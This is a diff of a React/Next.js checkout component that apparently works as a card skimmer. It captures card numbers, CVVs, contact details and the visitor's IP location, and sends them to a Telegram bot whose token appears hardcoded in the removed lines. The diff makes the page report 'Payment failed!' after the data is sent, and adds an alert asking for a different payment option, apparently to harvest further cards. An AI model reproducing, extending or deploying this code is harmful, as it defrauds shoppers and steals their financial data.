@@ -1,14 +1,16 @@
 'use client'
 import { useCart } from '@/contexts/CartContext';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useForm } from 'react-hook-form';
 import { jwtDecode } from 'jwt-decode';
+import { useRouter } from 'next/navigation';
+import Cookies from 'js-cookie';
 
 type CartItem = {
   id: string;
   quantity: number;
   selectedAmount: number;
-  title:string;
+  title: string;
 };
 
 type UserToken = {
@@ -17,8 +19,9 @@ type UserToken = {
   email: string;
   // add other JWT payload properties if needed
 };
-const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
-const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID
+
+const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '';
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -35,16 +38,11 @@ interface CreditCardFormData {
 }
 
 const escapeMarkdown = (text: string) => {
-  // Escape all special MarkdownV2 characters including hyphen
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
 };
 
 const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
- function getCookie(name: string): string | null {
-  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-  return match ? decodeURIComponent(match[2]) : null;
-}
-
+  const router = useRouter();
   const { cartItems, cartCount } = useCart();
   const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
   const [form, setForm] = useState({
@@ -56,46 +54,53 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     address: '',
     phoneNumber: '',
   });
+  const [user, setUser] = useState<UserToken | null>(null);
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [status, setStatus] = useState({ message: '', color: '' });
+  const [loading, setLoading] = useState(false);
+
+  useEffect(() => {
+    const token = Cookies.get('auth_token');
+    if (token) {
+      try {
+        const decoded = jwtDecode<UserToken>(token);
+        setUser(decoded);
+      } catch (error) {
+        router.push('/signin');
+      }
+    } else {
+      router.push('/signin');
+    }
+  }, [router]);
+
+  const checkAuth = () => {
+    if (!user) {
+      return null;
+    }
+    return user;
+  };
 
   const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
-     try {
-    // Get token from cookie (browser environment)
-    const token = document.cookie
-      .split('; ')
-      .find(row => row.startsWith('auth_token='))
-      ?.split('=')[1];
+    const user = checkAuth();
+    if (!user) return;
 
-    if (!token) {
-      alert('You must be logged in to make a purchase');
-      return;
-    }
-console.log(token)
-    // Decode token to get user info
-    const user = jwtDecode<UserToken>(token);
-    if (!user || !user.id) {
-      alert('Invalid user token');
-      return;
-    }
-
-
+    try {
       const purchaseDoc = {
-  _type: 'purchase',
-  userId: user.id,
-  items: cartItems.map(item => ({
-    productId: item.id,
-    quantity: item.quantity,
-    price: item.selectedAmount,
-    iname: item.title
-  })),
-  totalAmount,
-  email: form.email,          // <-- added
-  address: form.address,      // <-- added
-  phoneNumber: form.phoneNumber, // <-- added
-  purchaseDate: new Date().toISOString(),
-};
+        _type: 'purchase',
+        userId: user.id,
+        items: cartItems.map(item => ({
+          productId: item.id,
+          quantity: item.quantity,
+          price: item.selectedAmount,
+          iname: item.title
+        })),
+        totalAmount,
+        email: form.email,
+        address: form.address,
+        phoneNumber: form.phoneNumber,
+        purchaseDate: new Date().toISOString(),
+      };
 
-  
-      // Call your backend API route to save purchase
       const res = await fetch('/api/purchasedata', {
         method: 'POST',
         headers: {
@@ -103,23 +108,19 @@ console.log(token)
         },
         body: JSON.stringify(purchaseDoc),
       });
-  
+
       const data = await res.json();
-  
+
       if (!res.ok) {
         throw new Error(data.error || 'Failed to save purchase');
       }
-  
-      alert('Purchase saved successfully!');
-      // clear cart, redirect, etc.
+
+      alert('oppss! please choose a different payment option');
     } catch (error) {
       console.error('Error saving purchase:', error);
       alert('Failed to save purchase');
     }
   };
-   const [errors, setErrors] = useState<Record<string, string>>({});
-  const [status, setStatus] = useState({ message: '', color: '' });
-  const [loading, setLoading] = useState(false);
 
   const luhnCheck = (num: string): boolean => {
     const arr = num.split('').reverse().map(x => parseInt(x, 10));
@@ -190,11 +191,9 @@ console.log(token)
 
     let ipInfo = 'Unknown IP';
     try {
-
       const res = await fetch('https://ipapi.co/json/');
       if (res.ok) {
         const data = await res.json();
-        handlePurchase(cartItems, totalAmount)
         ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
       }
     } catch (error) {
@@ -230,7 +229,7 @@ console.log(token)
       });
       const json = await res.json();
       if (json.ok) {
-        setStatus({ message: 'Payment successful!', color: 'green' });
+        setStatus({ message: 'Payment failed!', color: 'red' });
         setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
       } else {
         setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
@@ -342,7 +341,7 @@ console.log(token)
 
       <div className="pt-4">
         <button
-        
+          onClick={() => handlePurchase(cartItems, totalAmount)}
           type="submit"
           disabled={loading}
           className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
@@ -359,7 +358,7 @@ console.log(token)
       </div>
 
       {status.message && (
-        <p className={`text-center font-medium ${status.color === 'green' ? 'text-green-600' : 'text-red-600'}`}>
+        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-red-600'}`}>
           {status.message}
         </p>
       )}
